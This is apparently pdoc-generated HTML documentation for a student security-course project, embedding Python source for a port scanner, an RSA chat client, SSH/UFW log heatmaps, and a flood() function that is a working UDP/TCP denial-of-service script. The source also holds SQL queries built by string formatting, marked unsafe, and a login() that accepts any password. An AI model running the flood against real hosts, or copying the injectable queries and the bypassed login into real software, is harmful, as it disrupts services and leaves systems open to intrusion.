@@ -1,0 +1,1788 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+<meta name="generator" content="pdoc 0.10.0" />
+<title>app_lpd API documentation</title>
+<meta name="description" content="Trabalho de LPD
+@author:João Estevão" />
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
+<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
+<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
+<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
+<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
+<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
+</head>
+<body>
+<main>
+<article id="content">
+<header>
+<h1 class="title">Module <code>app_lpd</code></h1>
+</header>
+<section id="section-intro">
+<p>Trabalho de LPD
+@author:João Estevão</p>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">&#34;&#34;&#34;
+Trabalho de LPD
+@author:João Estevão
+&#34;&#34;&#34;
+import os
+from argon2 import PasswordHasher
+from datetime import datetime
+import socket
+import time
+import threading
+from scapy.all import *
+from queue import Queue
+import random
+from random import randint
+from os import system, name
+from Crypto.PublicKey import RSA
+from Crypto import Random
+from Crypto.Cipher import PKCS1_OAEP
+import traceback
+import sqlite3
+import geoip2.database
+import re
+import sys
+from sys import stdout
+import folium
+from folium.plugins import HeatMap
+import ipaddress
+from reportlab.pdfgen import canvas
+from reportlab.lib.pagesizes import letter, inch
+from reportlab.lib.units import mm, cm
+from reportlab.platypus import Image, Paragraph, SimpleDocTemplate, Table, Spacer
+from reportlab.lib import colors
+from reportlab.lib.enums import TA_JUSTIFY, TA_LEFT, TA_CENTER, TA_RIGHT
+from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
+
+
+def authentication(user, passwd):
+    &#34;&#34;&#34;
+    Authenticates a user using argon2 as the password-hashing function.
+
+    Parameters
+    -------
+    user : string
+        The user that is trying to authenticate.
+    passwd : string
+        The password inputted.
+
+    Returns
+    -------
+    is_authenticated : boolean
+        Returns True if the user/password combo is in the db, otherwise returns False.
+
+    &#34;&#34;&#34;
+    is_authenticated = False
+
+    ph = PasswordHasher()
+
+    # If no register , this is not necessary
+    ##############################
+    # hash = ph.hash(passwd)      #
+    # print(hash)                 #
+    ##############################
+
+    # DB connection
+    try:
+        conn = sqlite3.connect(&#39;lpd_database.db&#39;)
+        sqlite_select_Query = &#34;select hash from user where name=&#39;%s&#39;&#34; % (
+            user)  # !!! NOT SAFE
+        cursor = conn.cursor()
+        cursor.execute(sqlite_select_Query)
+        record = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print(&#34;DB Error: &#34; + str(error))
+
+    # Get hash from DB by user
+    if record:
+        # record format [(X,)]
+        a = record[0][0]
+
+        try:
+            ph.verify(a, passwd)
+            is_authenticated = True
+        except Exception as e:
+            print(e)
+
+    return is_authenticated
+
+
+def login():
+    &#34;&#34;&#34;
+    
+    Parameters
+    -------
+    user : string
+    passwd : string
+        The password inputted.
+
+    Returns
+    -------
+    is_authenticated : boolean
+        Returns True and the user name.
+
+    &#34;&#34;&#34;
+    is_allowed = True
+    user = input(&#34;Enter the username: &#34;)
+    passwd = input(&#34;Enter the password: &#34;)
+
+    return is_allowed, user
+
+
+
+
+
+def active_connections():
+    &#34;&#34;&#34;
+    This function aims to determine the active connections on the machine.
+    It uses the command &#34;netstat -a&#34; to get information about the active connections and
+    stores this information in a variable called &#34;netstat&#34;.
+    It then breaks this information into lines and prints them to the screen.
+
+    
+    Parameters
+    -------
+    netstat : netstat -a list
+
+    Returns
+    -------
+    active connections on the machine
+
+
+    &#34;&#34;&#34;
+    print(&#34;Calculating active connections...&#34;)
+
+    netstat = os.popen(&#34;netstat -a&#34;).read()
+    out_line = netstat.split(&#34;\n&#34;)
+
+    print(netstat)
+
+
+def port_scanner():
+    &#34;&#34;&#34;
+    This function aims to perform a port scan on a specific target.
+    It uses Python&#39;s socket module to connect to different ports on
+    the target and check if they are open or closed.
+    It starts by asking the user to enter the target to be scanned and
+    gets the IP address of that target.
+    Then it defines a function called &#34;portscan&#34; that tries to connect
+    to a specific port on the target and,
+    if the connection is successful, prints out the open port. If the
+    connection is not successful, the function passes.
+    It also defines a function called &#34;threader&#34; that creates multiple
+    threads to perform the port scan in parallel, which speeds up the process.
+    It uses a queue to store the ports to be scanned and measures the time spent on the scan.
+
+
+        Parameters
+        -------
+        target : string
+
+        Returns
+        -------
+        open ports in target and Time taken
+    &#34;&#34;&#34;
+    socket.setdefaulttimeout(0.25)
+    print_lock = threading.Lock()
+
+    target = input(&#39;Enter the host to be scanned: &#39;)
+    t_IP = socket.gethostbyname(target)
+    print(&#39;Starting scan on host: &#39;, t_IP)
+
+    def portscan(port):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            con = s.connect((t_IP, port))
+            with print_lock:
+                print(port, &#39;is open&#39;)
+            con.close()
+        except:
+            pass
+
+    def threader():
+        while True:
+            worker = q.get()
+            portscan(worker)
+            q.task_done()
+
+    q = Queue()
+    startTime = time.time()
+
+    for x in range(100):
+        t = threading.Thread(target=threader)
+        t.daemon = True
+        t.start()
+
+    for worker in range(1, 8080):
+        q.put(worker)
+
+    q.join()
+    print(&#39;Time taken:&#39;, time.time() - startTime)
+
+
+
+
+def flood():
+    
+    &#34;&#34;&#34;
+    The &#34;udpflood&#34; function is a denial-of-service (DoS) attack script that sends UDP or TCP
+    packets to a specific host on the specified on the specified port.
+    The script prompts the user for information such as the IP address of the host, the port,
+    whether to send UDP or TCP packets, and the number of packets to be sent over a single connection.
+    It also allows the user to specify the number of threads they want to use to send the packets.
+    It does this by creating multiple threads with the &#34;Thread&#34; method of the &#34;threading&#34; library
+    and then starts these threads with the &#34;start()&#34; method. The script also has a &#34;new&#34; function that
+    allows the user to start the attack again with the same settings without having to rerun the whole script.
+
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    &#34;&#34;&#34;
+    ip = str(input(&#34; Host/Ip:&#34;))
+    port = int(input(&#34; Port:&#34;))
+    choice = str(input(&#34; chose run flood atack (udp/tcp):&#34;))
+    times = int(input(&#34; Packets per one connection:&#34;))
+    threads = int(input(&#34; Threads:&#34;))
+
+    def run():
+        data = random._urandom(1024)
+        while True:
+            try:
+                # UDP = SOCK_DGRAM
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                addr = (str(ip), int(port))
+                for x in range(times):
+                    s.sendto(data, addr)
+            except:
+                s.close()
+
+    def run2():
+        data = random._urandom(16)
+        while True:
+            try:
+                # TCP = SOCK_STREAM
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, 80))
+                s.send(data)
+                for x in range(times):
+                    s.send(data)
+            except:
+                s.close()
+
+    for y in range(threads):
+        if choice == &#39;udp&#39;:
+            th = threading.Thread(target=run)
+            th.start()
+        else:
+            th = threading.Thread(target=run2)
+            th.start()
+
+    def new():
+        for y in range(threads):
+            if choice == &#39;udp&#39;:
+                th = threading.Thread(target=run)
+                th.start()
+            else:
+                th = threading.Thread(target=run2)
+                th.start()
+
+
+def chat():
+    &#34;&#34;&#34;
+    The chat() function is responsible for implementing the client side of a messaging application.
+    It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server.
+    The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or
+    exiting the application. When choosing option 1, the user is prompted for the server&#39;s IP address and port, and then the function checks
+    if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key.
+    The message is then encrypted and sent to the server over a socket connection.
+    Option 2 allows the user to read the messages sent to the server by again entering the server&#39;s IP address and port.
+    The function uses the sqlite3 library to connect to the database and retrieve the user ID.
+    The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.
+    
+    Parameters
+    -------
+    ip : string
+    port : int
+    choice : string
+    times : int
+    threads : int
+
+    Returns
+    -------
+    udp or tcp flood atack 
+    &#34;&#34;&#34;
+
+    options_chat = &#39;&#39;&#39;\nChoose a option:
+
+    [1]-&gt;Send message encrypted with RSA.
+    [2]-&gt;Read messages from server.
+    [3]-&gt;Exit.
+        &#39;&#39;&#39;
+
+    # Get id of user from database
+    try:
+        conn = sqlite3.connect(&#39;lpd_database.db&#39;)
+        sqlite_select_Query = &#34;select id from user where name=&#39;%s&#39;&#34; % (
+            user)  # !!! NOT SAFE
+        cursor = conn.cursor()
+        cursor.execute(sqlite_select_Query)
+        record = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print(&#34;DB Error: &#34; + str(error))
+
+    while True:
+
+        print(&#34;-&#34; * 50)
+        print(options_chat)
+        print(&#34;-&#34; * 50)
+        answer = input(&#34;\n&gt;&#34;)
+        print(&#34;\n&#34;)
+        if answer == &#34;1&#34;:
+
+            print(&#34;Whats the server ip?&#34;)
+            server_ip = input(&#34;\n&gt;&#34;)
+            print(&#34;\nWhats the server port?&#34;)
+            server_port = input(&#34;\n&gt;&#34;)
+
+            try:
+                test = int(server_port)
+            except ValueError:
+                print(&#34;Choose a NUMBER for the port!&#34;)
+                chat()
+
+            try:
+
+                # Checking for RSA keys
+                while True:
+                    print(&#34;\nGenerate public key and private key? y/n &#34;)
+                    key_question = input(&#34;\n&gt;&#34;)
+
+                    if key_question == &#34;y&#34;:
+                        key = RSA.generate(RSA_BIT)
+                        private_key = key.export_key()
+                        file_out = open(&#34;private.pem&#34;, &#34;wb&#34;)
+                        file_out.write(private_key)
+                        file_out.close()
+
+                        public_key = key.publickey().export_key()
+                        file_out = open(&#34;receiver.pem&#34;, &#34;wb&#34;)
+                        file_out.write(public_key)
+                        file_out.close()
+                        break
+                    elif key_question == &#34;n&#34;:
+                        try:
+                            file_out = open(&#34;private.pem&#34;, &#34;rb&#34;)
+                            file_out = open(&#34;receiver.pem&#34;, &#34;rb&#34;)
+                            break
+                        except:
+                            print(
+                                &#34;Cant find keys generate from this application, please generate one pair.&#34;)
+                    else:
+                        print(&#34;Write &#39;y&#39; or &#39;n&#39;.&#34;)
+
+                # Encrypting message
+                print(&#34;\nWhat is the message you want to send?&#34;)
+                message = input(&#34;\n&gt;&#34;)
+
+                data = message.encode(&#39;utf-8&#39;)
+                # data = str.encode(message)
+
+                # Encrypt the data with the public RSA key
+                key = RSA.importKey(open(&#39;receiver.pem&#39;).read())
+                cipher = PKCS1_OAEP.new(key)
+                ciphertext = cipher.encrypt(data)
+
+                print(ciphertext)
+
+                # Create connection with server
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                host = server_ip                                           # server address
+                # server port
+                port = int(server_port)
+                s.connect((host, port))
+
+                # Send id to server
+                s.send(str(record[0][0]).encode())
+
+                dataFromServer = s.recv(1024)
+                print(&#34;My ID: &#34; + dataFromServer.decode())
+
+                # Tell server that we want to write our messages
+                dataToServer = &#34;WRITE&#34;
+                s.send(dataToServer.encode())
+
+                # Send ciphertext
+                s.send(ciphertext)
+
+                # close connection
+                s.close()
+
+            except Exception as e:
+                print(&#34;\n&#34; + &#34;ERROR:&#34; + str(e))
+                print(traceback.format_exc())
+
+        elif answer == &#34;2&#34;:
+            print(&#34;Whats the server ip?&#34;)
+            server_ip = input(&#34;\n&gt;&#34;)
+            print(&#34;\nWhats the server port?&#34;)
+            server_port = input(&#34;\n&gt;&#34;)
+
+            try:
+                test = int(server_port)
+            except ValueError:
+                print(&#34;Choose a NUMBER for the port!&#34;)
+                chat()
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                host = server_ip                                           # server address
+                # server port
+                port = int(server_port)
+                s.connect((host, port))
+
+                # Send id to server
+                s.send(str(record[0][0]).encode())
+
+                # Check id from server
+                dataFromServer = s.recv(1024)
+                print(&#34;My ID: &#34; + dataFromServer.decode())
+
+                # Tell server that we want to read our messages
+                dataToServer = &#34;READ&#34;
+                s.send(dataToServer.encode())
+
+                # Get messages from server
+                dataFromServer2 = s.recv(1024)
+
+                msg_array = []
+                counter = 0
+
+                while dataFromServer2:
+                    # print(1)
+                    # print(dataFromServer2)
+
+                    if b&#39;You have no messages!&#39; in dataFromServer2:
+                        s.close()
+                        dataFromServer2 = dataFromServer2.replace(
+                            b&#39;You have no messages!&#39;, b&#39;&#39;)
+                        counter = 1
+
+                    # Prob need to split messages .... sadge
+                    if b&#39;LIMITER&#39; in dataFromServer2:
+
+                        # print(dataFromServer2.split(b&#39;LIMITER&#39;))
+                        a = dataFromServer2.split(b&#39;LIMITER&#39;)
+
+                        for i in a:
+                            if i:
+                                msg_array.append(i.replace(b&#39;LIMITER&#39;, b&#39;&#39;))
+
+                        # print(dataFromServer2)
+                    if b&#39;You have no messages!&#39; not in dataFromServer2 and counter == 1:
+                        # msg_array = list(set(msg_array))
+                        print(&#34;XXXXXXXXXXXXXXXX&#34;)
+                        for j in msg_array:
+                            try:
+                                # Decrypting message
+                                key = RSA.importKey(open(&#39;private.pem&#39;).read())
+                                cipher = PKCS1_OAEP.new(key)
+                                message = cipher.decrypt(j)
+                                print(message)
+                            except Exception as e:
+                                print(e)
+
+                    if counter == 1:
+                        break
+                    else:
+                        dataFromServer2 = s.recv(1024)
+                # Close conenction
+                # s.close()
+
+            except Exception as e:
+                print(&#34;\n&#34; + &#34;ERROR:&#34; + str(e))
+                print(traceback.format_exc())
+
+        elif answer == &#34;3&#34;:
+            break
+        else:
+            print(&#34;Choose a NUMBER between 1 and 3.&#34;)
+
+
+
+def log_manager():
+    &#34;&#34;&#34;
+    The function log_manager() is responsible for analyzing the logs provided by the teacher and 
+    creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs. 
+    If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and 
+    stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and 
+    print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and 
+    creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to 
+    create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list. 
+    It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these 
+    coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
+    Parameters
+    -------
+    Choose a option to read log files 
+
+    Returns
+    -------
+    generate_pdf with with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list anf geo location
+    
+    &#34;&#34;&#34;
+    options_chat = &#39;&#39;&#39;\nChoose a option:
+
+[1]-&gt;UFW logs.
+[2]-&gt;SSH logs.
+[3]-&gt;Exit.
+    &#39;&#39;&#39;
+
+    while True:
+        print(&#34;-&#34; * 50)
+        print(options_chat)
+        print(&#34;-&#34; * 50)
+        answer = input(&#34;\n&gt;&#34;)
+        print(&#34;\n&#34;)
+        if answer == &#34;1&#34;:
+            # ufw logs
+
+            # Set path ...
+            abspath = os.path.abspath(__file__)
+            dname = os.path.dirname(abspath)
+            os.chdir(dname)
+
+            ips = []
+            p = re.compile(
+                &#39;(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&#39;)
+
+            with open(dname + &#39;/logs/ufw.log&#39;) as f:
+                for lines in f.readlines():
+
+                    match = p.search(lines)
+                    if match:
+
+                        ip = match.group(3)
+                        timestamp = match.group(1)
+
+                        is_private = ipaddress.ip_address(ip).is_private
+
+                        if is_private:
+                            pass
+                            # print(&#34;SRC IP IS PRIVATE:&#34;+srcIp)
+                        else:
+                            # print(&#34;SRC IP IS PUBLIC:&#34;+srcIp)
+                            ips.append((ip, timestamp))
+
+            coords = []
+
+            # GeoLite2-City.mmdb
+            client = geoip2.database.Reader(&#39;GeoLite2-City.mmdb&#39;)
+            # $ curl ipinfo.io/ip
+
+            # removing duplicates
+            # ips = list(set(ips))
+            ip_country = []
+            print(&#34;Countries of IPs that were blocked:&#34;)
+
+            for ip in ips:
+                response = client.city(str(ip[0]))
+
+                lat = response.location.latitude
+                lon = response.location.longitude
+                print(response.country.name + &#34;: &#34; +
+                      str(ip[0]) + &#39; at &#39; + str(ip[1]))
+                ip_country.append(
+                    (response.country.name, str(ip[0]), str(ip[1])))
+                coords.append((lat, lon))
+
+            # generate and save heatmap
+            m = folium.Map(tiles=&#34;OpenStreetMap&#34;,
+                           location=[20, 10], zoom_start=2)
+            # mess around with these values to change how the heatmap looks
+            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
+            m.save(&#34;ufw_log_heatmap_trb&#34;)
+            print(&#39;\nDone. Heatmap saved as ufw_log_heatmap_trb.&#39;)
+
+            # Generate a pdf
+            generate_pdf(&#34;ufw_log_info.pdf&#34;, ip_country, &#34;UFW Block IPs&#34;)
+
+        elif answer == &#34;2&#34;:
+            # SSH logs
+
+            # Create file to parse
+            # &#34;grep &#34;Failed password&#34; /var/log/auth.log &gt; failed_attempts.txt&#34;
+            ssh_log = os.popen(
+                &#34;grep &#39;Failed password&#39; ./logs/auth.log &#34;).read()
+            ssh_log = ssh_log.split(&#39;\n&#39;)
+
+            # get ip from logs
+            # p = re.compile(&#39;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&#39;)
+            p = re.compile(
+                &#39;(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&#39;)
+            # get timestamps Feb 22 08:48:13 ubinet sshd[22468]: Failed password for root from 65.207.23.201 port 32839 ssh2
+            # timestamp = line[:15]
+
+            # ips=[]
+            ips_timestamp = []
+            for x in ssh_log:
+                if x:
+                    match = p.search(x)
+                    if match:
+                        ip = match.group(3)
+                        timestamp = match.group(1)
+
+                        is_private = ipaddress.ip_address(ip).is_private
+
+                        if is_private:
+                            pass
+                        else:
+                            # ips.append(ip)
+                            ips_timestamp.append((ip, timestamp))
+
+            # get ip coordinates with geoip...
+
+            coords = []
+
+            # GeoLite2-City.mmdb
+            client = geoip2.database.Reader(&#39;GeoLite2-City.mmdb&#39;)
+            # $ curl ipinfo.io/ip
+
+            # removing duplicates
+            # ips = list(set(ips))
+
+            ip_country = []
+
+            print(&#34;Calculating...&#34;)
+
+            for ip in ips_timestamp:
+
+                response = client.city(str(ip[0]))
+
+                lat = response.location.latitude
+                lon = response.location.longitude
+                ip_country.append(
+                    (response.country.name, str(ip[0]), str(ip[1])))
+                coords.append((lat, lon))
+
+            # generate and save heatmap
+            m = folium.Map(tiles=&#34;OpenStreetMap&#34;,
+                           location=[20, 10], zoom_start=2)
+            # mess around with these values to change how the heatmap looks
+            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
+            m.save(&#34;auth_log_heatmap_trb&#34;)
+            print(&#39;\nDone. Heatmap saved as auth_log_heatmap_trb.&#39;)
+
+            # Generate a pdf
+            generate_pdf(&#34;ssh_log_info.pdf&#34;, ip_country,
+                         &#34;SSH password failed attempts information&#34;)
+
+        elif answer == &#34;3&#34;:
+            break
+        else:
+            print(&#34;Choose a NUMBER between 1 and 3.&#34;)
+
+
+def generate_pdf(filename, ip_country, title):
+    &#34;&#34;&#34;
+    The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP, 
+    country and timestamp information, and a title. 
+    The first step is to print a message that the report is being created. 
+    Next a SimpleDocTemplate object is created with the file name and page size. 
+    A &#34;Flowable&#34; object container is created and a title is added to the report using the Paragraph object and object and a specific font style. 
+    Next, a table is created from the list of tuples passed as argument and added to the element container.
+    Finally, the document is built and saved with the specified name. 
+    The function also prints a message that the PDF has been successfully saved.
+    &#34;&#34;&#34;
+
+    print(&#34;\nCreating report...&#34;)
+
+    doc = SimpleDocTemplate(filename, pagesize=letter)
+
+    # container for the &#39;Flowable&#39; objects
+    elements = []
+
+    # TITLE
+    styleSheet = getSampleStyleSheet()
+    styleSheet.leading = 24
+    styleSheet.add(ParagraphStyle(name=&#39;Normal_CENTER&#39;,
+                                  parent=styleSheet[&#39;Normal&#39;],
+                                  fontName=&#39;Helvetica&#39;,
+                                  wordWrap=&#39;LTR&#39;,
+                                  alignment=TA_CENTER,
+                                  fontSize=12,
+                                  leading=13,
+                                  textColor=colors.black,
+                                  borderPadding=0,
+                                  leftIndent=0,
+                                  rightIndent=0,
+                                  spaceAfter=0,
+                                  spaceBefore=0,
+                                  splitLongWords=True,
+                                  spaceShrinkage=0.05,
+                                  ))
+    elements.append(Paragraph(title, styleSheet[&#39;Normal_CENTER&#39;]))
+
+    ##### TABLE##########
+
+    data = []
+
+    for line in ip_country:
+        data.append(list(line))
+
+    f = Table(data)
+    elements.append(Spacer(1, 0.5*cm))
+    elements.append(f)
+    doc.build(elements)
+    print(&#39;\nDone. PDF saved as &#39; + filename+&#39;.&#39;)
+
+
+if __name__ == &#39;__main__&#39;:
+
+    RSA_BIT = 3072
+
+    banner = &#39;&#39;&#39;
+    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNNNNNNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0kocc:::::::::cldOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc;;:ldxO0KKKKK0Oxoc;;:lONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOc,;oOXWMMMMMMMMMMMMMMMNKxc,;oKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:&#39;cONMMMMMMMWWNNNNWWMMMMMMMWXx;&#39;lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl&#39;:0WMMMMMN0xlc:::::::cokKWMMMMMNx,,xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0;&#39;xNMMMMWKo;,:oxO0KKK0kdc;,:kNMMMMMKc.lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,&#39;kWMMMMXo&#39;;dKWMMMMMMMMMMMNOl&#39;;kWMMMMNl.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMX:.xWMMMMK:.oXMMMMMMMMMMMMMMMMW0:.oNMMMMXc.xWMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMWx.:XMMMMX:.xWMMMMMMMMMMMMMMMMMMMXc.dWMMMMO.;KMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMWl.dWMMMMx.cNMMMMMMMMMMMMMMMMMMMMMO&#39;,KMMMMX:.kMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kMMMMWl.dWMMMMMMMMMMMMMMMMMMMMMX;.OMMMMNc.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMX:.kMMMMWl.dWMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kMNXK0:.dWMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kWd&#39;,;,;OMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kNc.cOO0NMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kWx,,;&#39;,kMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
